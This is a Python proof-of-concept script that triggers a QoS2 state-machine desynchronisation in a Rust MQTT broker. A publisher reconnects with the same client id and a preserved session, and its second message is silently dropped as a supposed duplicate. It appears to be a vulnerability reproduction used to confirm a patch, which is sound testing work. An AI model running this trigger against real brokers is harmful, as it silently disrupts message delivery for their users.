#!/usr/bin/env python3
"""
VUL-001 Trigger Demo: QoS2 State Machine Desynchronization
===========================================================

This script demonstrates how the ghost subscription / silent message drop
vulnerability can be triggered in the mqtt-broker project.

Prerequisites:
    pip install paho-mqtt

Usage:
    1. Start the mqtt-broker:  cargo run --bin mqtt-v5-broker
    2. Run this script:        python trigger_demo.py

Expected behaviour (vulnerable):
    - subscriber does NOT receive the second QoS2 message (silent drop)

Expected behaviour (patched):
    - subscriber receives BOTH QoS2 messages
"""

import sys
import time
import threading
import paho.mqtt.client as mqtt

BROKER_HOST = "127.0.0.1"
BROKER_PORT = 1883
TOPIC = "test/vuln001/sensor"
CLIENT_ID_PUB = "publisher-vuln001"
CLIENT_ID_SUB = "subscriber-vuln001"

received_messages = []
event_ready = threading.Event()


# ──────────────────────────────────────────────────────────────
# Subscriber
# ──────────────────────────────────────────────────────────────
def on_sub_connect(client, userdata, flags, rc, properties=None):
    print(f"[SUB] Connected (rc={rc})")
    client.subscribe(TOPIC, qos=2)
    print(f"[SUB] Subscribed to {TOPIC} (QoS2)")
    event_ready.set()


def on_sub_message(client, userdata, msg):
    payload = msg.payload.decode()
    print(f"[SUB] <<< Received: topic={msg.topic}  payload={payload}  qos={msg.qos}")
    received_messages.append(payload)


def start_subscriber():
    sub = mqtt.Client(
        client_id=CLIENT_ID_SUB,
        protocol=mqtt.MQTTv5,
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    )
    sub.on_connect = on_sub_connect
    sub.on_message = on_sub_message
    sub.connect(BROKER_HOST, BROKER_PORT, keepalive=60, clean_start=True)
    sub.loop_start()
    return sub


# ──────────────────────────────────────────────────────────────
# Publisher — performs the trigger sequence
# ──────────────────────────────────────────────────────────────
def run_publisher_sequence():
    """
    Trigger sequence:
      Phase 1: connect (clean_start=False), publish QoS2 msg-1, disconnect
      Phase 2: reconnect (clean_start=False, same client_id) → session inherited
               publish QoS2 msg-2 which may reuse a packet_id that is still
               stuck in `outgoing_publish_receives` → silent drop
    """

    # ── Phase 1 ──────────────────────────────────────────────
    print("\n[PUB] ═══ Phase 1: initial QoS2 publish ═══")
    pub1 = mqtt.Client(
        client_id=CLIENT_ID_PUB,
        protocol=mqtt.MQTTv5,
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    )
    pub1.connect(BROKER_HOST, BROKER_PORT, keepalive=60, clean_start=False)
    pub1.loop_start()
    time.sleep(0.5)

    info1 = pub1.publish(TOPIC, payload=b"msg-1-initial", qos=2)
    info1.wait_for_publish(timeout=5)
    print(f"[PUB] >>> Published msg-1 (mid={info1.mid})")
    time.sleep(1)

    # Disconnect without clean_start — session is preserved on the broker
    pub1.disconnect()
    pub1.loop_stop()
    print("[PUB] Disconnected (session preserved)")
    time.sleep(1)

    # ── Phase 2 ──────────────────────────────────────────────
    print("\n[PUB] ═══ Phase 2: reconnect (clean_start=False) + second publish ═══")
    pub2 = mqtt.Client(
        client_id=CLIENT_ID_PUB,
        protocol=mqtt.MQTTv5,
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    )
    pub2.connect(BROKER_HOST, BROKER_PORT, keepalive=60, clean_start=False)
    pub2.loop_start()
    time.sleep(0.5)

    info2 = pub2.publish(TOPIC, payload=b"msg-2-should-arrive", qos=2)
    info2.wait_for_publish(timeout=5)
    print(f"[PUB] >>> Published msg-2 (mid={info2.mid})")
    time.sleep(2)

    pub2.disconnect()
    pub2.loop_stop()
    print("[PUB] Disconnected")


# ──────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────
def main():
    print("=" * 60)
    print(" VUL-001 Trigger Demo")
    print(" QoS2 State Machine Desynchronization")
    print("=" * 60)
    print(f" Broker: {BROKER_HOST}:{BROKER_PORT}")
    print(f" Topic:  {TOPIC}")
    print("=" * 60)

    # Start subscriber
    sub = start_subscriber()
    event_ready.wait(timeout=5)
    time.sleep(0.5)

    # Run publisher trigger sequence
    run_publisher_sequence()

    # Wait and check
    time.sleep(3)
    sub.disconnect()
    sub.loop_stop()

    # ── Results ──────────────────────────────────────────────
    print("\n" + "=" * 60)
    print(" RESULTS")
    print("=" * 60)
    print(f" Messages received by subscriber: {len(received_messages)}")
    for i, msg in enumerate(received_messages):
        print(f"   [{i+1}] {msg}")

    if len(received_messages) < 2:
        print("\n ⚠  VULNERABILITY TRIGGERED: msg-2 was silently dropped!")
        print("    The stale packet_id in outgoing_publish_receives caused")
        print("    the broker to classify the second PUBLISH as a duplicate.")
        return 1
    else:
        print("\n ✓  All messages delivered. Vulnerability NOT triggered.")
        print("    (Broker may be patched, or packet_id did not collide.)")
        return 0


if __name__ == "__main__":
    sys.exit(main())
